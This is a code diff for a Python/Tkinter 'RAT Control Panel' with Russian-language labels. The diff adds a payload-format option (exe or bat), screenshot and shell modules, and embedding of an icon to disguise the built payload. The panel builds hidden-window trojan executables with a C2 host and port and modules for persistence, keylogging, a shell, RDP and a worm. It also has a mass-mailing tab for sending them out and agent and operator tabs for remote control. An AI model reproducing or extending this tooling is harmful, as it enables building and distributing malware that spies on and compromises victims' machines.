@@ -1,4 +1,5 @@
 # language: Python, file: panel.py
+# *Главная панель: заставка app.ico, Builder с C2 host/port, Рассылка, Agent, Operator*
 import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib, shutil
 import threading, importlib.util, re, smtplib
 import tkinter as tk
@@ -26,24 +27,12 @@ try:
 except ImportError:
     HAS_QT = False
 
-# --- Сплэш-экран ---
-class SplashScreen(tk.Toplevel):
-    def __init__(self, master, icon_path):
-        super().__init__(master)
-        self.overrideredirect(True)
-        self.geometry("400x300+500+300")
-        self.configure(bg="#111111")
-        try:
-            img = tk.PhotoImage(file=icon_path)
-            lbl_img = tk.Label(self, image=img, bg="#111111")
-            lbl_img.image = img
-            lbl_img.pack(expand=True)
-        except Exception:
-            tk.Label(self, text="[ICON]", fg="white", bg="#111111", font=("Arial", 20)).pack(expand=True)
-        tk.Label(self, text="Loading...", fg="#00ffcc", bg="#111111", font=("Consolas", 12, "bold")).pack(pady=10)
-        self.update()
+try:
+    from PIL import Image, ImageTk
+    HAS_PIL = True
+except ImportError:
+    HAS_PIL = False
 
-# --- Основной код ---
 CFG_PATH = BASE / "mail_config.json"
 DEFAULT_CFG = {
     "smtp_host": "smtp.gmail.com", "smtp_port": 587,
@@ -97,7 +86,12 @@ class BuilderTab(ttk.Frame):
             self.vars[k] = v
             r += 1
 
-        ttk.Button(self, text="Сохранить C2 в конфиг", command=self.save_cfg).grid(row=r, column=0, columnspan=2, sticky="ew", pady=(4, 8))
+        ttk.Button(self, text="Сохранить в конфиг", command=self.save_cfg).grid(row=r, column=0, columnspan=2, sticky="ew", pady=(4, 8))
+        r += 1
+
+        ttk.Label(self, text="Формат payload").grid(row=r, column=0, sticky="w")
+        self.fmt = tk.StringVar(value="exe")
+        ttk.Combobox(self, textvariable=self.fmt, values=["exe", "bat"], state="readonly", width=10).grid(row=r, column=1, sticky="w")
         r += 1
 
         self.var_safe = tk.BooleanVar(value=True)
@@ -106,14 +100,14 @@ class BuilderTab(ttk.Frame):
 
         mods = ttk.LabelFrame(self, text="Модули", padding=6)
         mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
-        all_mods = ["persistence", "keylogger", "worm", "rdp"]
+        all_mods = ["persistence", "keylogger", "screenshot", "shell", "rdp", "worm"]
         for i, m in enumerate(all_mods):
             v = tk.BooleanVar(value=True)
             ttk.Checkbutton(mods, text=m, variable=v).grid(row=i // 3, column=i % 3, sticky="w")
             self.mods[m] = v
         r += 1
 
-        ttk.Button(self, text="Собрать payload", command=self.build).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")
+        ttk.Button(self, text="Собрать payload (через cmd)", command=self.build).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")
 
     def save_cfg(self):
         cfg = _load_cfg()
@@ -125,7 +119,7 @@ class BuilderTab(ttk.Frame):
             cfg[k] = val
         _save_cfg(cfg)
         self.on_cfg_saved(cfg)
-        self.log("[cfg] C2 сохранен")
+        self.log("[cfg] Сохранено")
 
     def build(self):
         cfg = {k: v.get() for k, v in self.vars.items()}
@@ -139,7 +133,7 @@ class BuilderTab(ttk.Frame):
         if not cfg["c2_host"]:
             messagebox.showerror("Ошибка", "Заполни C2 host.")
             return
-
+            
         py = _python_exe()
         if not py: return messagebox.showerror("Ошибка", "Python не найден.")
 
@@ -150,14 +144,21 @@ class BuilderTab(ttk.Frame):
 
         out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить payload"))
         if not out_dir: return
+        
+        self.log(f"[build] Старт сборки {self.fmt.get()}...")
+        threading.Thread(target=self._compile, args=(src, work, self.fmt.get(), out_dir, py), daemon=True).start()
 
-        self.log(f"[build] Старт сборки...")
-        threading.Thread(target=self._compile, args=(src, work, out_dir, py), daemon=True).start()
-
-    def _compile(self, src, work, out_dir, py):
+    def _compile(self, src, work, fmt, out_dir, py):
         try:
             flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
             cmd = [py, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "payload", "--distpath", str(out_dir), str(src)]
+            
+            # Если есть app.ico, добавляем её в сборку payload (иконка файла)
+            ico = RES / "app.ico"
+            if ico.exists():
+                cmd.insert(4, f"--icon={ico}")
+                cmd.insert(4, f"--add-data={ico};.")
+            
             subprocess.run(cmd, cwd=work, check=True, capture_output=True, creationflags=flags)
             self.log(f"[build] OK: {out_dir / 'payload.exe'}")
             self.after(0, messagebox.showinfo, "Готово", "Payload собран.")
@@ -177,7 +178,7 @@ class MassMailTab(ttk.Frame):
     def _ui(self):
         self.columnconfigure(1, weight=1)
         ttk.Label(self, text="SMTP").grid(row=0, column=0, sticky="w")
-        self.smtp_label = ttk.Label(self, text=f"{self.cfg['smtp_user'] or 'не настроено'}")
+        self.smtp_label = ttk.Label(self, text=f"{self.cfg['smtp_user']}")
         self.smtp_label.grid(row=0, column=1, columnspan=2, sticky="w")
 
         ttk.Label(self, text="Получатели (по одному на строку)", font=("", 10, "bold")).grid(row=1, column=0, columnspan=3, sticky="w", pady=(10, 2))
@@ -289,13 +290,15 @@ class AgentTab(ttk.Frame):
         self.rowconfigure(4, weight=1)
 
     def _log(self, s):
-        self.out.configure(state="normal"); self.out.insert("end", s + "\n"); self.out.see("end"); self.out.configure(state="disabled"); self.log(s)
+        self.out.configure(state="normal")
+        self.out.insert("end", s + "\n")
+        self.out.see("end")
+        self.out.configure(state="disabled")
+        self.log(s)
 
     def start(self):
         py = _python_exe(); agent = RES / "rdp_agent.py"
-        if not py or not agent.exists():
-            self._log(f"[agent] нет {agent}")
-            return
+        if not py or not agent.exists(): return self._log("[!] нет python или agent.py")
         env = os.environ.copy(); env.update({"RAT_HOST": self.var_host.get(), "RAT_PORT": self.var_port.get(), "RAT_SAFE": "1" if self.var_safe.get() else "0"})
         self._proc = subprocess.Popen([py, str(agent)], env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
         threading.Thread(target=self._read, daemon=True).start()
@@ -315,7 +318,11 @@ class OperatorTab(ttk.Frame):
         self.out = scrolledtext.ScrolledText(self, height=10, state="disabled"); self.out.pack(fill="both", expand=True)
     
     def _log(self, s):
-        self.out.configure(state="normal"); self.out.insert("end", s + "\n"); self.out.see("end"); self.out.configure(state="disabled"); self.log(s)
+        self.out.configure(state="normal")
+        self.out.insert("end", s + "\n")
+        self.out.see("end")
+        self.out.configure(state="disabled")
+        self.log(s)
 
     def launch(self):
         if not HAS_QT: return self._log("[!] PyQt5 не установлен")
@@ -331,27 +338,43 @@ class OperatorTab(ttk.Frame):
 
 class Panel(tk.Tk):
     def __init__(self):
-        super().__init__()
-        self.withdraw() # Скрываем основное окно до конца сплэша
-        self.title("RAT Control Panel"); self.geometry("1000x780")
-        
-        # Сплэш
-        icon = RES / "app.ico"
-        self.splash = SplashScreen(self, str(icon) if icon.exists() else "")
-        self.after(1500, self._show_main)
-
+        super().__init__(); self.title("RAT Control Panel"); self.geometry("1000x780")
         nb = ttk.Notebook(self); nb.pack(fill="both", expand=True, padx=8, pady=8)
         self.log_txt = scrolledtext.ScrolledText(self, height=5, state="disabled"); self.log_txt.pack(fill="x", padx=8, pady=(0, 8))
         self.tab_builder = BuilderTab(nb, self.log, lambda c: None); nb.add(self.tab_builder, text="Builder")
         self.tab_mail = MassMailTab(nb, self.log); nb.add(self.tab_mail, text="Рассылка")
         nb.add(AgentTab(nb, self.log), text="Agent"); nb.add(OperatorTab(nb, self.log), text="Operator")
-
-    def _show_main(self):
-        self.splash.destroy()
-        self.deiconify()
-
+    
     def log(self, line):
         self.log_txt.configure(state="normal"); self.log_txt.insert("end", f"{time.strftime('%H:%M:%S')} {line}\n"); self.log_txt.see("end"); self.log_txt.configure(state="disabled")
 
 if __name__ == "__main__":
-    Panel().mainloop()
+    root = tk.Tk()
+    root.withdraw()
+    
+    # Показ заставки, если есть app.ico
+    ico_path = RES / "app.ico"
+    if ico_path.exists() and HAS_PIL:
+        try:
+            splash = tk.Toplevel(root)
+            splash.overrideredirect(True)
+            splash.attributes("-topmost", True)
+            img = Image.open(ico_path)
+            # Масштабируем, если иконка маленькая (например, 256x256)
+            img = img.resize((256, 256), Image.Resampling.LANCZOS)
+            ph = ImageTk.PhotoImage(img)
+            lbl = tk.Label(splash, image=ph, bg="black")
+            lbl.image = ph
+            lbl.pack()
+            
+            sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
+            splash.geometry(f"256x256+{(sw-256)//2}+{(sh-256)//2}")
+            splash.update()
+            time.sleep(2.0) # Ждем 2 секунды
+            splash.destroy()
+        except Exception as e:
+            pass # Если что-то пошло не так, просто пропускаем заставку
+
+    # Запуск основной панели
+    app = Panel()
+    app.mainloop()
